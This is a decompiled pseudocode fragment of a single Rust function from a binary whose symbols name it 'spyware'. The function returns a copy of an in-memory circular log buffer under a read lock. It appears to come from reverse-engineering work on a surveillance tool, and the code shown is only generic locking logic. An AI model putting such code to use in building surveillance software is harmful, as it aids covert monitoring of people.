__int64 __fastcall spyware::logging::memory_logger::CircularMemoryLogs::get_all_logs(__int64 a1, __int64 a2)
{
  __int64 v2; // rax
  __int64 v3; // rdx
  __int64 v4; // rbx
  _BYTE v6[48]; // [rsp+8h] [rbp-30h] BYREF

  std::sys::sync::rwlock::futex::RwLock::read(a2);
  std::sync::rwlock::RwLockReadGuard<T>::new(v6, a2);
  v2 = core::result::Result<T,E>::unwrap(v6);
  v4 = v3;
  <alloc::vec::Vec<T,A> as core::clone::Clone>::clone(a1, v2, &off_B9C70);
  return core::ptr::drop_in_place<std::sync::rwlock::RwLockReadGuard<alloc::vec::Vec<alloc::string::String>>>(v4);
}